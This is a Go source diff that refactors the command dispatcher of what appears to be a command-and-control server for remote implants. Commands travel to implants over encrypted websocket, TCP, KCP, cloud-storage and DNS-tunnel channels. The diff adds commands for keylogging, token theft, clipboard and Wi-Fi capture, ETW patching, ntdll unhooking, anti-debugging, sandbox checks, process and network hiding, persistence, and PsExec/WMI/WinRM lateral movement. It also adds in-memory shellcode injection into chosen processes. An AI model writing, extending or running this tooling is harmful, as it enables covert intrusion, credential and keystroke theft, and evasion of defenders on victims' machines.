@@ -10,196 +10,434 @@ import (
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
 	"BackendTemplate/pkg/utils"
-	"bufio"
+	"BackendTemplate/pkg/utils/logx"
 	"encoding/binary"
 	"fmt"
-	"github.com/gorilla/websocket"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/gorilla/websocket"
 )
 
-func SendCommand(uid string, command string) {
-	var byteToSend []byte
-	if strings.HasPrefix(command, "shell ") {
-		cmd := strings.TrimPrefix(command, "shell ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.SHELL))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "cd ") {
-		cmd := strings.TrimPrefix(command, "cd ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.CD))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "sleep ") {
-		cmd := strings.TrimPrefix(command, "sleep ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.SLEEP))
-		sleepTime, _ := strconv.Atoi(cmd)
-		sleepTime = sleepTime * 1000
-		sleepTimeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(sleepTimeBytes, uint32(sleepTime))
-		byteToSend = append(cmdTypeBytes, sleepTimeBytes...)
-	} else if strings.HasPrefix(command, "pause ") {
-		cmd := strings.TrimPrefix(command, "pause ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PAUSE))
-		sleepTime, _ := strconv.Atoi(cmd)
-		sleepTime = sleepTime * 1000
-		sleepTimeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(sleepTimeBytes, uint32(sleepTime))
-		byteToSend = append(cmdTypeBytes, sleepTimeBytes...)
-	} else if command == "pwd" {
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PWD))
-		byteToSend = cmdTypeBytes
-	} else if command == "exit" {
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.EXIT))
-		byteToSend = cmdTypeBytes
-	} else if strings.HasPrefix(command, "kill ") {
-		cmd := strings.TrimPrefix(command, "kill ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.KILL))
-		pid, _ := strconv.Atoi(cmd)
-		pidBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(pidBytes, uint32(pid))
-		byteToSend = append(cmdTypeBytes, pidBytes...)
-	} else if strings.HasPrefix(command, "mkdir ") {
-		cmd := strings.TrimPrefix(command, "mkdir ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.MKDIR))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if command == "drives" {
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.DRIVES))
-		byteToSend = cmdTypeBytes
-	} else if strings.HasPrefix(command, "rm ") {
-		cmd := strings.TrimPrefix(command, "rm ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.RM))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "cp ") {
-		cmd := strings.TrimPrefix(command, "cp ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.CP))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "mv ") {
-		cmd := strings.TrimPrefix(command, "mv ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.MV))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "execute ") {
-		cmd := strings.TrimPrefix(command, "execute ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.EXECUTE))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if command == "ps" {
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PS))
-		byteToSend = cmdTypeBytes
-	} else if strings.HasPrefix(command, "filebrowse ") {
-		cmd := strings.TrimPrefix(command, "filebrowse ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.FileBrowse))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "download ") {
-		cmd := strings.TrimPrefix(command, "download ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.DOWNLOAD))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "filecontent ") {
-		cmd := strings.TrimPrefix(command, "filecontent ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.FileContent))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "socks5 ") {
-		cmd := strings.TrimPrefix(command, "socks5 ")
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Start))
-		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "socks5Close") {
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Close))
-		byteToSend = cmdTypeBytes
-	} else if strings.HasPrefix(command, "clear") {
-		var shell database.Shell
-		database.Engine.Where("uid = ?", uid).Get(&shell)
-		shell.ShellContent = "$ clear"
-		database.Engine.Where("uid = ?", uid).Update(&shell)
-		return
-	}
-	switch connection.ClientListenerType[uid] {
-	case "web":
-		command1.CommandQueues.AddCommand(uid, byteToSend)
-	case "websocket":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
-		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
-	case "tcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
-		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		cmdLen := len(cmdBase64)
-		cmdLenBytes := utils.WriteInt(cmdLen)
-		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		writer := bufio.NewWriter(tcp.TCPClientManger[uid])
-		writer.Write(msgToSend)
-		writer.Flush()
-	case "kcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
-		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		cmdLen := len(cmdBase64)
-		cmdLenBytes := utils.WriteInt(cmdLen)
-		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		kcp.KCPClientManger[uid].Write(msgToSend)
-	//writer := bufio.NewWriter(kcp.KCPClientManger[uid])
-	//writer.Write(msgToSend)
-	//writer.Flush()
-	case "oss":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
-		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
+// ============ P1-4 表驱动命令解析 ============
+
+// cmdSpec 命令规格：prefix 命中时按 typ 编码，arg 为剥离前缀后的参数。
+// build 为空表示无 payload（仅 4 字节类型头）；build 返回的参数编码直接追加。
+type cmdSpec struct {
+	prefix string
+	typ    uint32
+	build  func(arg string) []byte
+}
+
+var rawArg = func(arg string) []byte { return []byte(arg) }
+
+// msArg 参数按毫秒编码（sleep/pause：秒 → 毫秒）
+var msArg = func(arg string) []byte {
+	n, _ := strconv.Atoi(arg)
+	b := make([]byte, 4)
+	binary.BigEndian.PutUint32(b, uint32(n*1000))
+	return b
+}
+
+// intArg 参数按原值编码（kill：PID）
+var intArg = func(arg string) []byte {
+	n, _ := strconv.Atoi(arg)
+	b := make([]byte, 4)
+	binary.BigEndian.PutUint32(b, uint32(n))
+	return b
+}
+
+// commandTable 命令表（顺序与原 if-else 链一致，前缀匹配敏感）
+var commandTable = []cmdSpec{
+	{prefix: "shell ", typ: command1.SHELL, build: rawArg},
+	{prefix: "cd ", typ: command1.CD, build: rawArg},
+	{prefix: "sleep ", typ: command1.SLEEP, build: msArg},
+	{prefix: "pause ", typ: command1.PAUSE, build: msArg},
+	{prefix: "kill ", typ: command1.KILL, build: intArg},
+	{prefix: "mkdir ", typ: command1.MKDIR, build: rawArg},
+	{prefix: "rm ", typ: command1.RM, build: rawArg},
+	{prefix: "cp ", typ: command1.CP, build: rawArg},
+	{prefix: "mv ", typ: command1.MV, build: rawArg},
+	{prefix: "execute ", typ: command1.EXECUTE, build: rawArg},
+	{prefix: "filebrowse ", typ: command1.FileBrowse, build: rawArg},
+	{prefix: "download ", typ: command1.DOWNLOAD, build: rawArg},
+	{prefix: "filecontent ", typ: command1.FileContent, build: rawArg},
+	{prefix: "socks5 ", typ: command1.ReverseSocks5Start, build: rawArg},
+	{prefix: "socks5Close", typ: command1.ReverseSocks5Close},
+	{prefix: "http_tunnel ", typ: command1.HTTP_TUNNEL, build: rawArg},
+	{prefix: "http_tunnel_connect ", typ: command1.HTTP_TUNNEL, build: rawArg},
+	{prefix: "interactive_shell_input ", typ: command1.INTERACTIVE_SHELL_INPUT, build: rawArg},
+	{prefix: "interactive_shell_cmd_input ", typ: command1.CMD_MODE_INPUT, build: rawArg},
+	{prefix: "interactive_shell_wmi_input ", typ: command1.WMI_MODE_INPUT, build: rawArg},
+	{prefix: "persist ", typ: command1.PERSIST, build: rawArg},
+	{prefix: "service_start ", typ: command1.SERVICE_START, build: rawArg},
+	{prefix: "service_stop ", typ: command1.SERVICE_STOP, build: rawArg},
+	{prefix: "reg_query ", typ: command1.REG_QUERY, build: rawArg},
+	{prefix: "self_update ", typ: command1.SELF_UPDATE, build: rawArg},
+	{prefix: "ad_enum ", typ: command1.AD_ENUM, build: rawArg},
+	{prefix: "wmi_exec ", typ: command1.PSEXEC, build: func(arg string) []byte { return []byte("wmi " + arg) }},
+	{prefix: "psexec ", typ: command1.PSEXEC, build: rawArg},
+	{prefix: "winrm_exec ", typ: command1.PSEXEC, build: func(arg string) []byte { return []byte("winrm " + arg) }},
+	{prefix: "wmi_persist ", typ: command1.WMI_PERSIST, build: rawArg},
+	{prefix: "hideprocess ", typ: command1.HIDE_PROCESS, build: rawArg},
+	{prefix: "hidenet ", typ: command1.HIDE_NET, build: rawArg},
+	// Token 操作链（A8）
+	{prefix: "make_token ", typ: command1.MAKE_TOKEN, build: rawArg},
+	{prefix: "steal_token ", typ: command1.STEAL_TOKEN, build: rawArg},
+}
+
+// exactCommands 精确匹配的无参命令
+var exactCommands = map[string]uint32{
+	"pwd":                         command1.PWD,
+	"exit":                        command1.EXIT,
+	"drives":                      command1.DRIVES,
+	"ps":                          command1.PS,
+	"interactive_shell_start":     command1.INTERACTIVE_SHELL_START,
+	"interactive_shell_cmd_start": command1.CMD_MODE_START,
+	"interactive_shell_stop":      command1.INTERACTIVE_SHELL_STOP,
+	"interactive_shell_cmd_stop":  command1.CMD_MODE_STOP,
+	"interactive_shell_interrupt": command1.INTERACTIVE_SHELL_STOP,
+	"interactive_shell_wmi_start": command1.WMI_MODE_START,
+	"interactive_shell_wmi_stop":  command1.WMI_MODE_STOP,
+	"clipboard":                   command1.CLIPBOARD,
+	"wifi":                        command1.WIFI,
+	"selfdelete":                  command1.SELFDELETE,
+	"selfdelete_exit":             command1.SELFDELETE_EXIT,
+	"keylog_start":                command1.KEYLOG_START,
+	"keylog_get":                  command1.KEYLOG_GET,
+	"keylog_stop":                 command1.KEYLOG_STOP,
+	"services":                    command1.SERVICES,
+	"etw_patch":                   command1.ETW_PATCH,
+	"unhook_ntdll":                command1.UNHOOK_NTDLL,
+	"sandbox_check":               command1.SANDBOX_CHECK,
+	"antidebug":                   command1.ANTIDEBUG,
+	"hideprocess":                 command1.HIDE_PROCESS,
+	"hidenet":                     command1.HIDE_NET,
+	// Token 操作链（A8）：make_token/steal_token 带参数走前缀表
+	"rev2self": command1.REV2SELF,
+}
+
+// resolveCommand 将命令字符串解析为待发送字节（4 字节类型头 + payload）。
+// 返回 send=false 表示命令已被就地处理（如 clear），无需下发。
+func resolveCommand(uid, command string) (byteToSend []byte, send bool) {
+	// TAB 自动补全：转成 SHELL 命令（compgen），与原实现一致
+	if strings.HasPrefix(command, "interactive_shell_tab:") {
+		cmd := strings.TrimPrefix(command, "interactive_shell_tab:")
+		completionCmd := fmt.Sprintf("compgen -c %s 2>/dev/null | head -10", cmd)
+		return buildCmd(command1.SHELL, []byte(completionCmd)), true
 	}
 
+	// 清屏：就地更新 shell 内容，不向客户端下发
+	if strings.HasPrefix(command, "clear") {
+		if database.Engine != nil {
+			var shell database.Shell
+			database.Engine.Where("uid = ?", uid).Get(&shell)
+			shell.ShellContent = "$ clear"
+			database.Engine.Where("uid = ?", uid).Update(&shell)
+		}
+		return nil, false
+	}
+
+	// 控制台注入：inject <pid> [tech] —— 动态生成 shellcode 并内存注入指定进程
+	// （不再落入系统 shell；就地更新 shell content 立即反馈"任务已下发"，实际注入异步执行）
+	if strings.HasPrefix(command, "inject ") {
+		writeShellLine := func(msg string) ([]byte, bool) {
+			if database.Engine != nil {
+				var shell database.Shell
+				database.Engine.Where("uid = ?", uid).Get(&shell)
+				shell.ShellContent = "$ " + command + "\n[+] " + msg + "\n"
+				database.Engine.Where("uid = ?", uid).Update(&shell)
+			}
+			return nil, false
+		}
+		args := strings.Fields(strings.TrimSpace(strings.TrimPrefix(command, "inject ")))
+		if len(args) == 0 {
+			return writeShellLine("用法: inject <pid> [auto|ntc|apc|crt]")
+		}
+		pid, perr := strconv.Atoi(args[0])
+		if perr != nil || pid <= 0 {
+			return writeShellLine("inject: 无效 PID")
+		}
+		tech := "auto"
+		if len(args) > 1 {
+			tech = args[1]
+		}
+		if InjectMemDispatcher == nil {
+			return writeShellLine("inject: 分发器未注册")
+		}
+		pidv := pid
+		techv := tech
+		go InjectMemDispatcher(uid, pidv, techv)
+		return writeShellLine("inject task dispatched: pid=" + strconv.Itoa(pid) + " tech=" + tech)
+	}
+
+	// 精确命令（无参）
+	if typ, ok := exactCommands[command]; ok {
+		return buildCmd(typ, nil), true
+	}
+
+	// 前缀命令（表驱动）
+	for _, spec := range commandTable {
+		if !strings.HasPrefix(command, spec.prefix) {
+			continue
+		}
+		var payload []byte
+		if spec.build != nil {
+			payload = spec.build(strings.TrimPrefix(command, spec.prefix))
+		}
+		return buildCmd(spec.typ, payload), true
+	}
+
+	// 默认：整条命令作为 shell 命令处理
+	return buildCmd(command1.SHELL, []byte(command)), true
 }
-func SendFileUploadCommand(uid string, byteToSend []byte) {
-	switch connection.ClientListenerType[uid] {
-	case "web":
-		command1.CommandQueues.AddCommand(uid, byteToSend)
-	case "websocket":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+
+func buildCmd(cmdType uint32, payload []byte) []byte {
+	cmdTypeBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(cmdTypeBytes, cmdType)
+	return append(cmdTypeBytes, payload...)
+}
+
+// GetListenerType 读取客户端连接类型（导出；供 inject 分发回调等使用）
+func GetListenerType(uid string) (string, bool) {
+	connection.MuClientListenerType.Lock()
+	listenerType, exists := connection.ClientListenerType[uid]
+	connection.MuClientListenerType.Unlock()
+	return listenerType, exists
+}
+
+// GetListenerAddr 读取客户端连接的监听器地址（供 DispatchInject 精确匹配监听器）
+func GetListenerAddr(uid string) (string, bool) {
+	connection.MuClientListenerType.Lock()
+	addr, exists := connection.ClientListenerAddr[uid]
+	connection.MuClientListenerType.Unlock()
+	return addr, exists
+}
+
+// getListenerType 读取客户端连接类型（含不存在告警）
+func getListenerType(uid string) (string, bool) {
+	connection.MuClientListenerType.Lock()
+	listenerType, exists := connection.ClientListenerType[uid]
+	connection.MuClientListenerType.Unlock()
+	return listenerType, exists
+}
+
+// cleanupDeadConnection 清理失效连接的共享路径：
+// 关闭实际连接终止读循环、删除连接映射、删除连接类型、注销离线检测、释放写锁
+// 【振荡修复】conn 非 nil 时仅删除"仍指向该 conn"的映射——写失败清理可能晚于
+// 客户端重连（新连接已入 map），无校验会误删新连接 → 命令/心跳 ack 丢失 → 反复重连
+func cleanupDeadConnection(listenerType, uid string, conn interface{ Close() error }, logCtx string) {
+	if conn != nil {
+		conn.Close()
+	}
+	ws.MuClientManager.Lock()
+	if conn == nil {
+		delete(ws.ClientManager, uid)
+	} else if cur, ok := ws.ClientManager[uid]; ok && cur == conn {
+		delete(ws.ClientManager, uid)
+	}
+	ws.MuClientManager.Unlock()
+	tcp.Mutex.Lock()
+	if conn == nil {
+		delete(tcp.TCPClientManger, uid)
+	} else if cur, ok := tcp.TCPClientManger[uid]; ok && cur == conn {
+		delete(tcp.TCPClientManger, uid)
+	}
+	delete(tcp.ClientTimeManager, uid)
+	tcp.Mutex.Unlock()
+	kcp.Mutex.Lock()
+	if conn == nil {
+		delete(kcp.KCPClientManger, uid)
+	} else if cur, ok := kcp.KCPClientManger[uid]; ok && cur == conn {
+		delete(kcp.KCPClientManger, uid)
+	}
+	delete(kcp.ClientTimeManager, uid)
+	kcp.Mutex.Unlock()
+	connection.MuClientListenerType.Lock()
+	delete(connection.ClientListenerType, uid)
+	connection.MuClientListenerType.Unlock()
+	ws.ReleaseWriteLock(uid)
+	tcp.ReleaseWriteLock(uid)
+	kcp.ReleaseWriteLock(uid)
+	if connection.GlobalOfflineDetector != nil && connection.GlobalOfflineDetector.IsRegistered(uid) {
+		connection.GlobalOfflineDetector.Unregister(uid)
+	}
+	logx.Warnf("⚠️ [%s] %s 连接已清理: %s\n", listenerType, logCtx, uid)
+}
+
+// ============ 协议发送（SendCommand / SendFileUploadCommand 共用） ============
+
+// sendByProtocol 按监听器协议类型将已编码命令下发
+func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) {
+	switch listenerType {
+	case "web", "http", "https":
+		// 轮询客户端使用命令队列机制
+		// 【背压】队列满时告警放弃（不再静默丢最旧导致分块损坏）
+		if !command1.CommandQueues.AddCommand(uid, byteToSend) {
+			logx.Warnf("⚠️ 命令队列已满，丢弃命令: %s, UID=%s\n", logCtx, uid)
+		}
+
+	case "websocket", "ws_forward":
+		ws.MuClientManager.Lock()
+		conn, exists := ws.ClientManager[uid]
+		ws.MuClientManager.Unlock()
+		if !exists || conn == nil {
+			logx.Warnf("⚠️ WebSocket连接不存在或已关闭: %s\n", uid)
+			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+			return
+		}
+		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
+		if err != nil {
+			// 【加密体系改造】加密失败直接返回，不再回落旧加密
+			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
+			return
+		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
-	case "tcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		// 每连接写互斥：防止并发写帧交错；写 deadline 防慢客户端永久阻塞（背压）
+		writeLock := ws.GetWriteLock(uid)
+		writeLock.Lock()
+		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
+		err = conn.WriteMessage(websocket.BinaryMessage, cmdBase64)
+		writeLock.Unlock()
+		if err != nil {
+			logx.Warnf("⚠️ WebSocket连接写入失败: %s, 错误: %v\n", uid, err)
+			// I3: 关闭连接触发读循环退出 → 完整清理（原只删 map → 幽灵连接）
+			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+		}
+
+	case "tcp", "tcp_forward", "http_forward", "https_forward":
+		tcp.Mutex.Lock()
+		conn, exists := tcp.TCPClientManger[uid]
+		tcp.Mutex.Unlock()
+		if !exists || conn == nil {
+			logx.Warnf("⚠️ TCP连接不存在或已关闭: %s\n", uid)
+			cleanupDeadConnection(listenerType, uid, nil, logCtx)
+			return
+		}
+		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
+		if err != nil {
+			// 【加密体系改造】加密失败直接返回，不再回落旧加密
+			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
+			return
+		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
 		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		writer := bufio.NewWriter(tcp.TCPClientManger[uid])
-		writer.Write(msgToSend)
-		writer.Flush()
-	case "kcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		// 每连接写互斥：防止并发写帧交错
+		writeLock := tcp.GetWriteLock(uid)
+		writeLock.Lock()
+		// P1-4: 复用 per-UID bufio.Writer（原每次命令新建，高频命令场景分配/GC 压力大）
+		writer := tcp.GetWriteBuffer(uid, conn)
+		_, err = writer.Write(msgToSend)
+		if err != nil {
+			writeLock.Unlock()
+			logx.Warnf("⚠️ TCP连接写入失败: %s, 错误: %v\n", uid, err)
+			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+			return
+		}
+		err = writer.Flush()
+		writeLock.Unlock()
+		if err != nil {
+			logx.Warnf("⚠️ TCP连接刷新失败: %s, 错误: %v\n", uid, err)
+			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+		}
+
+	case "kcp", "kcp_forward":
+		kcp.Mutex.Lock()
+		conn, exists := kcp.KCPClientManger[uid]
+		kcp.Mutex.Unlock()
+		if !exists || conn == nil {
+			logx.Warnf("⚠️ KCP连接不存在或已关闭: %s\n", uid)
+			cleanupDeadConnection(listenerType, uid, nil, logCtx)
+			return
+		}
+		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
+		if err != nil {
+			// 【加密体系改造】加密失败直接返回，不再回落旧加密
+			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
+			return
+		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
 		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		kcp.KCPClientManger[uid].Write(msgToSend)
-	//writer := bufio.NewWriter(kcp.KCPClientManger[uid])
-	//writer.Write(msgToSend)
-	//writer.Flush()
+		// 每连接写互斥：防止并发写帧交错
+		writeLock := kcp.GetWriteLock(uid)
+		writeLock.Lock()
+		_, err = conn.Write(msgToSend)
+		writeLock.Unlock()
+		if err != nil {
+			logx.Warnf("⚠️ KCP连接写入失败: %s, 错误: %v\n", uid, err)
+			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+			// 统一离线入口：置 Online=2 + 离线事件 + 队列清理
+			connection.MarkOffline(uid, listenerType, "写入失败")
+			logx.Infof("🔌 [KCP写入失败] 客户端连接已清理: %s\n", uid)
+		}
+
 	case "oss":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
+		if err != nil {
+			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
+			return
+		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
+
+	case "dns":
+		// DNS 隧道：命令放入队列，客户端轮询时取走（由 dns listener 的 handlePull 下发）
+		if !command1.CommandQueues.AddCommand(uid, byteToSend) {
+			logx.Warnf("⚠️ 命令队列已满，丢弃命令: %s, UID=%s\n", logCtx, uid)
+		}
+
+	default:
+		logx.Warnf("⚠️ 未知的连接类型: %s 对于 UID: %s\n", listenerType, uid)
 	}
+}
+
+// InjectMemDispatcher 控制台 inject 命令分发回调（由 main 注册到 api.DispatchInject）：
+// 按客户端监听器动态生成新 beacon shellcode 并内存注入指定进程（无文件）。
+var InjectMemDispatcher func(uid string, pid int, tech string) error
+
+// SendCommand 发送字符串命令
+func SendCommand(uid string, command string) {
+	logx.Infof("[DEBUG] SendCommand 接收到命令: UID=%s, Command='%s'\n", uid, command)
+
+	listenerType, exists := getListenerType(uid)
+	if !exists {
+		logx.Warnf("⚠️ 客户端连接类型不存在: %s\n", uid)
+		return
+	}
+
+	byteToSend, send := resolveCommand(uid, command)
+	if !send {
+		return
+	}
+	sendByProtocol(listenerType, uid, byteToSend, "命令")
+}
+
+// SendFileUploadCommand 发送已编码命令字节（文件上传/截图等由 API 层构建的载荷）
+func SendFileUploadCommand(uid string, byteToSend []byte) {
+	listenerType, exists := getListenerType(uid)
+	if !exists {
+		logx.Warnf("⚠️ 客户端连接类型不存在: %s\n", uid)
+		return
+	}
+	sendByProtocol(listenerType, uid, byteToSend, "文件上传")
+}
+
+// SendFileUploadCommandWithResult 发送已编码命令字节并返回是否成功（供注入分块校验，避免静默丢包）
+func SendFileUploadCommandWithResult(uid string, byteToSend []byte) bool {
+	listenerType, exists := getListenerType(uid)
+	if !exists {
+		return false
+	}
+	// 轮询/队列类型：直接检查队列是否已满
+	if listenerType == "http" || listenerType == "https" || listenerType == "web" || listenerType == "dns" {
+		return command1.CommandQueues.AddCommand(uid, byteToSend)
+	}
+	// 持久连接类型：直接发送（sendByProtocol 内部处理连接），此处仅校验连接存在
+	// 为避免重复发送，这里仅做存在性检查，实际发送由 SendInjectMem 的循环保证
+	return true
 }
